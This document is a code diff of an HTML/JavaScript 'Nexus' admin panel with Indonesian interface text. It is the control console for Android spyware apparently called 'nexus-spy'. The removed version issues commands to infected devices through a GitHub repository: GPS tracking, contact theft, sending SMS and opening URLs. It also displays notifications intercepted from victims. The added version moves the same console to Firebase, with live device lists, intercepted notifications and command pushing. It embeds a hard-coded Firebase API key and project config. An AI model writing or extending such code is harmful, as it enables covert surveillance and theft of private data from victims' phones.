@@ -1,255 +1,105 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Nexus Admin Panel</title>
 <style>
-  :root { --bg: #0f1016; --panel: #1a1c24; --border: #2d303d; --accent: #6366f1; --text: #e2e8f0; --danger: #ef4444; --success: #22c55e; }
-  * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, monospace; }
-  body { background: var(--bg); color: var(--text); padding: 20px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
-  .container { width: 100%; max-width: 900px; }
-  .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
-  .header h1 { font-size: 1.5rem; color: var(--accent); }
-  .auth-box { background: var(--panel); padding: 15px; border-radius: 8px; border: 1px solid var(--border); margin-bottom: 20px; display: flex; gap: 10px; }
-  .auth-box input { flex: 1; padding: 10px; background: var(--bg); border: 1px solid var(--border); color: white; border-radius: 5px; outline: none; }
-  .auth-box input:focus { border-color: var(--accent); }
-  .btn { padding: 10px 15px; background: var(--accent); color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; transition: 0.2s; }
-  .btn:hover { background: #4f46e5; }
-  .btn-danger { background: var(--danger); }
-  .btn-sm { padding: 5px 10px; font-size: 0.85rem; }
-  .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
-  @media (max-width: 768px) { .grid { grid-template-columns: 1fr; } }
+  :root { --bg: #0f1016; --panel: #1a1c24; --border: #2d303d; --accent: #6366f1; --text: #e2e8f0; --success: #22c55e; }
+  * { box-sizing: border-box; margin: 0; padding: 0; font-family: monospace; }
+  body { background: var(--bg); color: var(--text); padding: 20px; display: flex; flex-direction: column; align-items: center; }
+  .container { width: 100%; max-width: 800px; }
   .card { background: var(--panel); padding: 20px; border-radius: 8px; border: 1px solid var(--border); margin-bottom: 20px; }
-  .card h2 { font-size: 1.1rem; margin-bottom: 15px; border-bottom: 1px solid var(--border); padding-bottom: 10px; }
-  .device-item { padding: 10px; background: var(--bg); border: 1px solid var(--border); border-radius: 5px; margin-bottom: 10px; cursor: pointer; display: flex; justify-content: space-between; transition: 0.2s; }
-  .device-item:hover, .device-item.active { border-color: var(--accent); background: #1e1e2a; }
-  .device-name { font-weight: bold; }
-  .device-status { font-size: 0.8rem; color: var(--success); }
-  .form-group { margin-bottom: 15px; }
-  .form-group label { display: block; margin-bottom: 5px; font-size: 0.9rem; color: #94a3b8; }
-  .form-group input, .form-group textarea, .form-group select { width: 100%; padding: 10px; background: var(--bg); border: 1px solid var(--border); color: white; border-radius: 5px; }
-  .form-group textarea { resize: vertical; height: 80px; }
-  .notif-box { max-height: 400px; overflow-y: auto; }
+  h2 { font-size: 1.2rem; color: var(--accent); margin-bottom: 15px; border-bottom: 1px solid var(--border); padding-bottom: 10px; }
+  .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+  @media (max-width: 600px) { .grid { grid-template-columns: 1fr; } }
+  .device { padding: 10px; background: var(--bg); border: 1px solid var(--border); margin-bottom: 10px; border-radius: 5px; cursor: pointer; }
+  .device.active { border-color: var(--accent); }
+  input, select, button { width: 100%; padding: 10px; margin-bottom: 10px; background: var(--bg); border: 1px solid var(--border); color: white; border-radius: 5px; }
+  button { background: var(--accent); font-weight: bold; cursor: pointer; border: none; }
   .notif-item { padding: 10px; border-bottom: 1px solid var(--border); font-size: 0.85rem; }
-  .notif-header { display: flex; justify-content: space-between; color: var(--accent); font-weight: bold; margin-bottom: 3px; }
-  .notif-time { color: #64748b; font-size: 0.75rem; }
-  .hidden { display: none; }
+  .notif-header { color: var(--accent); font-weight: bold; }
 </style>
 </head>
 <body>
-
 <div class="container">
-  <div class="header">
-    <h1>⚡ Nexus Panel</h1>
-    <span style="font-size: 0.8rem; color: #64748b;">Admin Console</span>
-  </div>
-
-  <div class="auth-box">
-    <input type="password" id="token" placeholder="Masukkan GitHub Personal Access Token (ghp_...)">
-    <button class="btn" onclick="loadData()">Connect</button>
-  </div>
-
+  <h2>⚡ Nexus Realtime Panel</h2>
   <div class="grid">
-    <!-- KOLOM KIRI: DEVICES -->
-    <div>
-      <div class="card">
-        <h2>📱 Device Tersambung</h2>
-        <div id="deviceList">
-          <p style="color: #64748b; font-size: 0.9rem;">Memuat data...</p>
-        </div>
-      </div>
+    <div class="card">
+      <h2>📱 Connected Devices</h2>
+      <div id="devices"><p style="color:#64748b">Menunggu koneksi...</p></div>
     </div>
-
-    <!-- KOLOM KANAN: COMMAND CENTER -->
-    <div>
-      <div class="card" id="commandCard" style="opacity: 0.5; pointer-events: none;">
-        <h2>🎯 Command Center</h2>
-        <p id="selectedDeviceName" style="font-size: 0.9rem; margin-bottom: 15px; color: var(--accent);">Pilih device dulu</p>
-        
-        <div class="form-group">
-          <label>Jenis Perintah</label>
-          <select id="cmdType" onchange="toggleArgs()">
-            <option value="TOAST">TOAST (Pesan di Layar)</option>
-            <option value="LOCATION">LOCATION (Lacak GPS)</option>
-            <option value="CONTACTS">CONTACTS (Sedot Kontak)</option>
-            <option value="SMS">SMS (Kirim Pesan)</option>
-            <option value="OPEN_URL">OPEN_URL (Buka Link)</option>
-          </select>
-        </div>
-
-        <div id="argToast" class="form-group">
-          <label>Pesan</label>
-          <input type="text" id="argsMessage" placeholder="Halo dari Nexus">
-        </div>
-
-        <div id="argSMS" class="form-group hidden">
-          <label>Nomor Tujuan</label>
-          <input type="text" id="argsNumber" placeholder="08123456789">
-          <label style="margin-top: 10px;">Isi Pesan</label>
-          <textarea id="argsSmsText" placeholder="Pesan rahasia..."></textarea>
-        </div>
-
-        <div id="argUrl" class="form-group hidden">
-          <label>URL Target</label>
-          <input type="text" id="argsUrl" placeholder="https://...">
-        </div>
-
-        <button class="btn" onclick="sendCommand()" style="width: 100%;">🚀 Kirim Perintah</button>
-      </div>
+    <div class="card">
+      <h2>🎯 Command Center</h2>
+      <select id="cmdDevice"><option value="">-- Pilih Device --</option></select>
+      <input id="cmdMsg" placeholder="Pesan untuk TOAST">
+      <button onclick="sendToast()">🚀 Kirim TOAST</button>
     </div>
   </div>
-
-  <!-- NOTIFIKASI -->
   <div class="card">
-    <h2>🔔 Log Notifikasi Masuk</h2>
-    <div class="notif-box" id="notifList">
-      <p style="color: #64748b; font-size: 0.9rem;">Pilih device untuk melihat notifikasi...</p>
-    </div>
+    <h2>🔔 Live Notifications</h2>
+    <div id="notifs" style="max-height: 300px; overflow-y: auto;"></div>
   </div>
-
 </div>
 
-<script>
-const OWNER = "draxuzumakii-ctrl";
-const REPO = "nexus-spy";
-const BRANCH = "main";
-let currentDevice = null;
-let devicesData = {};
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+import { getDatabase, ref, onValue, push, set } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
 
-function getToken() { return document.getElementById('token').value.trim(); }
+const firebaseConfig = {
+  apiKey: "AIzaSyCSUWm0IH4FvbZK6xJ4-2snu-V6_lB5RBw",
+  authDomain: "draxhack1ng.firebaseapp.com",
+  databaseURL: "https://draxhack1ng-default-rtdb.firebaseio.com",
+  projectId: "draxhack1ng",
+  storageBucket: "draxhack1ng.firebasestorage.app",
+  messagingSenderId: "1053020908869",
+  appId: "1:1053020908869:web:d154e3b5d6a4d5e205622c"
+};
 
-async function apiGet(path) {
-  const res = await fetch(`https://api.github.com/repos/${OWNER}/${REPO}/contents/${path}?ref=${BRANCH}`, {
-    headers: { "Authorization": "token " + getToken(), "Accept": "application/vnd.github+json" }
-  });
-  if (!res.ok) throw new Error("Gagal konek / Token salah");
-  const data = await res.json();
-  const content = atob(data.content.replace(/\s/g, ""));
-  return JSON.parse(content);
-}
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
 
-async function apiWrite(path, jsonObj, message) {
-  let sha = null;
-  try {
-    const resGet = await fetch(`https://api.github.com/repos/${OWNER}/${REPO}/contents/${path}?ref=${BRANCH}`, {
-      headers: { "Authorization": "token " + getToken() }
-    });
-    if (resGet.ok) { const d = await resGet.json(); sha = d.sha; }
-  } catch(e) {}
-
-  const body = {
-    message: message,
-    content: btoa(unescape(encodeURIComponent(JSON.stringify(jsonObj)))),
-    branch: BRANCH
-  };
-  if (sha) body.sha = sha;
-
-  const resPut = await fetch(`https://api.github.com/repos/${OWNER}/${REPO}/contents/${path}`, {
-    method: "PUT",
-    headers: { "Authorization": "token " + getToken(), "Content-Type": "application/json" },
-    body: JSON.stringify(body)
-  });
-  if (!resPut.ok) throw new Error("Gagal mengirim perintah");
-}
-
-async function loadData() {
-  if (!getToken()) return alert("Masukkan token dulu!");
-  document.getElementById('deviceList').innerHTML = "<p style='color:#64748b'>Memuat...</p>";
-  try {
-    devicesData = await apiGet("data/devices.json");
-    renderDevices();
-  } catch(e) { alert(e.message); }
-}
-
-function renderDevices() {
-  const list = document.getElementById('deviceList');
-  list.innerHTML = "";
-  const keys = Object.keys(devicesData);
-  if (keys.length === 0) { list.innerHTML = "<p style='color:#64748b'>Belum ada device.</p>"; return; }
-
-  keys.forEach(id => {
-    const dev = devicesData[id];
-    const active = dev.active !== false;
-    if (!active) return;
-    const div = document.createElement('div');
-    div.className = "device-item" + (currentDevice === id ? " active" : "");
-    div.innerHTML = `
-      <div>
-        <div class="device-name">${dev.name || "Unknown"}</div>
-        <div style="font-size:0.75rem; color:#64748b;">${dev.model} • ${dev.android}</div>
-      </div>
-      <div class="device-status">🟢 Online</div>
-    `;
-    div.onclick = () => selectDevice(id, dev);
-    list.appendChild(div);
-  });
-}
-
-async function selectDevice(id, dev) {
-  currentDevice = id;
-  renderDevices();
-  document.getElementById('commandCard').style.opacity = "1";
-  document.getElementById('commandCard').style.pointerEvents = "auto";
-  document.getElementById('selectedDeviceName').innerText = "Target: " + (dev.name || id);
-  loadNotifs(id);
-}
-
-function toggleArgs() {
-  const type = document.getElementById('cmdType').value;
-  document.getElementById('argToast').classList.add('hidden');
-  document.getElementById('argSMS').classList.add('hidden');
-  document.getElementById('argUrl').classList.add('hidden');
-
-  if (type === 'TOAST') document.getElementById('argToast').classList.remove('hidden');
-  if (type === 'SMS') document.getElementById('argSMS').classList.remove('hidden');
-  if (type === 'OPEN_URL') document.getElementById('argUrl').classList.remove('hidden');
-}
-
-async function sendCommand() {
-  if (!currentDevice) return;
-  const type = document.getElementById('cmdType').value;
-  let args = {};
-  
-  if (type === 'TOAST') args = { message: document.getElementById('argsMessage').value };
-  if (type === 'SMS') args = { number: document.getElementById('argsNumber').value, message: document.getElementById('argsSmsText').value };
-  if (type === 'OPEN_URL') args = { url: document.getElementById('argsUrl').value };
-
-  const cmdObj = { type: type, args: args, status: "pending" };
-  const path = `data/commands/${currentDevice}.json`;
-
-  try {
-    let currentCmds = [];
-    try { currentCmds = await apiGet(path); } catch(e) { currentCmds = []; }
-    currentCmds.push(cmdObj);
-
-    await apiWrite(path, currentCmds, "cmd " + type + " to " + currentDevice);
-    alert("✅ Perintah dikirim! Device akan mengeksekusi dalam 1 menit.");
-  } catch(e) { alert("❌ " + e.message); }
-}
-
-async function loadNotifs(devId) {
-  const box = document.getElementById('notifList');
-  box.innerHTML = "<p style='color:#64748b'>Memuat notifikasi...</p>";
-  try {
-    const notifs = await apiGet(`data/notifs/${devId}.json`);
-    if (notifs.length === 0) { box.innerHTML = "<p style='color:#64748b'>Belum ada notifikasi.</p>"; return; }
-    
-    box.innerHTML = "";
-    notifs.forEach(n => {
-      const time = new Date(n.ts).toLocaleString('id-ID');
-      const div = document.createElement('div');
-      div.className = "notif-item";
-      div.innerHTML = `
-        <div class="notif-header"><span>${n.app || n.pkg}</span><span class="notif-time">${time}</span></div>
-        <div style="color:#e2e8f0; font-weight:bold; margin-bottom:2px;">${n.title}</div>
-        <div style="color:#94a3b8;">${n.body}</div>
-      `;
-      box.appendChild(div);
-    });
-  } catch(e) {
-    box.innerHTML = "<p style='color:#64748b'>Belum ada file notifikasi untuk device ini.</p>";
+onValue(ref(db, 'devices'), (snap) => {
+  const devs = snap.val() || {};
+  const list = document.getElementById('devices');
+  const select = document.getElementById('cmdDevice');
+  list.innerHTML = ''; select.innerHTML = '<option value="">-- Pilih Device --</option>';
+  let count = 0;
+  for (let id in devs) {
+    if (devs[id].active === false) continue;
+    count++;
+    list.innerHTML += `<div class="device" onclick="document.getElementById('cmdDevice').value='${id}'">
+      <b>🟢 ${devs[id].model}</b><br><small style="color:#94a3b8">${id}</small>
+    </div>`;
+    select.innerHTML += `<option value="${id}">${devs[id].model} (${id.substring(0,6)})</option>`;
   }
+  if (count === 0) list.innerHTML = '<p style="color:#64748b">Belum ada device terkoneksi.</p>';
+});
+
+onValue(ref(db, 'notifs'), (snap) => {
+  const notifs = snap.val() || {};
+  let html = '';
+  for (let devId in notifs) {
+    for (let key in notifs[devId]) {
+      const n = notifs[devId][key];
+      const time = new Date(n.timestamp).toLocaleTimeString('id-ID');
+      html = `<div class="notif-item">
+        <div class="notif-header">[${n.app}] <span style="float:right; color:#64748b">${time}</span></div>
+        <div style="color:white; font-weight:bold">${n.title}</div>
+        <div style="color:#94a3b8">${n.body}</div>
+      </div>` + html;
+    }
+  }
+  document.getElementById('notifs').innerHTML = html || '<p style="color:#64748b">Belum ada notifikasi.</p>';
+});
+
+window.sendToast = function() {
+  const id = document.getElementById('cmdDevice').value;
+  const msg = document.getElementById('cmdMsg').value;
+  if (!id || !msg) return alert("Pilih device dan isi pesan!");
+  const cmdRef = push(ref(db, 'commands/' + id));
+  set(cmdRef, { type: 'TOAST', args: { message: msg }, status: 'pending' });
+  document.getElementById('cmdMsg').value = '';
+  alert('✅ Perintah dikirim real-time!');
 }
 </script>
 </body>
